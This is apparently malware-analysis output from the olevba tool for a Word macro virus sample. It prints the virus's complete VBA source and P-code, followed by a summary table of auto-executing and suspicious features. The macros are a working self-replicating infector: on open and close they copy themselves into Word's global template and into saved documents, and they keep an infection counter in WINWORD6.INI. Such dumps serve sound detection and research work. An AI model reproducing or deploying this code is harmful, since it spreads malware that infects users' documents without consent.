olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hybrid.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hybrid.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hybrid.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


'Virus - NTTHNTA

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
Funyour
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Appder"
    WordBasic.MacroCopy sMacro$, "Global:Appder"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub

Private Sub Funyour()
Dim WOpen$
Dim sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NTTHNTA", "WINWORD6.INI")
End Sub 'Funyour
-------------------------------------------------------------------------------
VBA MACRO Appder.bas 
in file: Virus.MSWord.Hybrid.b - OLE stream: 'Macros/VBA/Appder'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


'Virus - NTTHNTA

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
Funyour
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Appder"
    WordBasic.MacroCopy sMacro$, "Global:Appder"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub

Private Sub Funyour()
Dim WOpen$
Dim sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NTTHNTA", "WINWORD6.INI")
End Sub 'Funyour
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Hybrid.b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


'   Virus - NTTHNTA

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Appder", sTMacro$
sTMacro$ = sMe$ + ":Appder"
WordBasic.MacroCopy "Global:Appder", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
Quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hybrid.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2738 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x000F "Virus - NTTHNTA"
' Line #4:
' Line #5:
' 	FuncDefn (Public Sub MAIN())
' Line #6:
' 	Dim 
' 	VarDefn iMacroCount
' Line #7:
' 	Dim 
' 	VarDefn i
' Line #8:
' 	Dim 
' 	VarDefn AClose
' Line #9:
' 	Dim 
' 	VarDefn Ad
' Line #10:
' 	Dim 
' 	VarDefn sMe
' Line #11:
' 	Dim 
' 	VarDefn sMacro
' Line #12:
' 	ArgsCall Funyour 0x0000 
' Line #13:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Quit 
' Line #14:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AClose 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0006 "Appder"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Ad 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld AClose 
' 	Not 
' 	Ld Ad 
' 	Not 
' 	And 
' 	IfBlock 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #25:
' 	Ld sMe$ 
' 	LitStr 0x0007 ":Appder"
' 	Add 
' 	St sMacro$ 
' Line #26:
' 	Ld sMacro$ 
' 	LitStr 0x000D "Global:Appder"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #28:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label Quit 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub Funyour())
' Line #34:
' 	Dim 
' 	VarDefn WOpen
' Line #35:
' 	Dim 
' 	VarDefn sales
' Line #36:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0008 " NTTHNTA"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #37:
' 	Ld WOpen$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St sales 
' Line #38:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 "NTTHNTA"
' 	Ld sales 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #39:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 "NTTHNTA"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #40:
' 	EndSub 
' 	QuoteRem 0x0008 0x0007 "Funyour"
' Macros/VBA/Appder - 2737 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x000F "Virus - NTTHNTA"
' Line #4:
' Line #5:
' 	FuncDefn (Public Sub MAIN())
' Line #6:
' 	Dim 
' 	VarDefn iMacroCount
' Line #7:
' 	Dim 
' 	VarDefn i
' Line #8:
' 	Dim 
' 	VarDefn AClose
' Line #9:
' 	Dim 
' 	VarDefn Ad
' Line #10:
' 	Dim 
' 	VarDefn sMe
' Line #11:
' 	Dim 
' 	VarDefn sMacro
' Line #12:
' 	ArgsCall Funyour 0x0000 
' Line #13:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Quit 
' Line #14:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AClose 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0006 "Appder"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Ad 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld AClose 
' 	Not 
' 	Ld Ad 
' 	Not 
' 	And 
' 	IfBlock 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #25:
' 	Ld sMe$ 
' 	LitStr 0x0007 ":Appder"
' 	Add 
' 	St sMacro$ 
' Line #26:
' 	Ld sMacro$ 
' 	LitStr 0x000D "Global:Appder"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #28:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label Quit 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub Funyour())
' Line #34:
' 	Dim 
' 	VarDefn WOpen
' Line #35:
' 	Dim 
' 	VarDefn sales
' Line #36:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0008 " NTTHNTA"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #37:
' 	Ld WOpen$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St sales 
' Line #38:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 "NTTHNTA"
' 	Ld sales 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #39:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 "NTTHNTA"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #40:
' 	EndSub 
' 	QuoteRem 0x0008 0x0007 "Funyour"
' Macros/VBA/AutoClose - 1966 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0012 "   Virus - NTTHNTA"
' Line #4:
' Line #5:
' 	FuncDefn (Public Sub MAIN())
' Line #6:
' 	Dim 
' 	VarDefn sMe
' Line #7:
' 	Dim 
' 	VarDefn sTMacro
' Line #8:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Quit 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #13:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #14:
' 	LitStr 0x000D "Global:Appder"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld sMe$ 
' 	LitStr 0x0007 ":Appder"
' 	Add 
' 	St sTMacro$ 
' Line #16:
' 	LitStr 0x000D "Global:Appder"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sTMacro$ 
' Line #18:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #20:
' 	GoTo Done 
' Line #21:
' 	Label Quit 
' Line #22:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #23:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Label Done 
' Line #26:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

